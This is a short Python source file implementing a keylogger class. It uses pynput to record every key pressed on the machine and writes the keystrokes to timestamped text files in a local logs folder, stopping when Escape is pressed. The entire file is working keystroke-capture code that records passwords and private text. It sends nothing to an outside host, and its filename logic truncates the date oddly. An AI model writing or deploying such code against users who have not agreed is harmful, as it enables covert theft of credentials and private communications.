from pynput import keyboard
import os
from datetime import datetime

class KeyLogger:
    def __init__(self) -> None:
        self.log = ""
        self.startDate = datetime.now().date()
        
    def callback(self, key) -> None:
        # not a character, special key (e.g ctrl, alt, etc.)
        # uppercase with []
        if key == keyboard.Key.space:
            # " " instead of "space"
            key = " "
        elif key == keyboard.Key.enter:
            # add a new line whenever an ENTER is pressed
            key = "[ENTER]\n"
            
        try:
            self.log += key.char
        except AttributeError:
            self.log += str(key)
        
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.startDate)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}"
        
    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        if os.path.exists("logs/") == False:
            os.mkdir("logs/")
        with open(f"logs/{self.filename}.txt", "a") as f:
            # write the keylogs to the file
            f.write(self.log)
        print(f"[+] Saved {self.filename}.txt")
        
    def report(self, key):
        if key == keyboard.Key.esc:
            print(f"{datetime.now()} - Stopped keylogger")
            return False
        if self.log:
             self.update_filename()
             self.report_to_file()
             self.log = ""
             
    def start(self):
        # start the keylogger
        self.listener = keyboard.Listener(
            on_press=self.callback,
            on_release=self.report)
        self.listener.start()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        
    def stop(self):
        print(f"{datetime.now()} - Stopped keylogger")
        self.listener.stop()
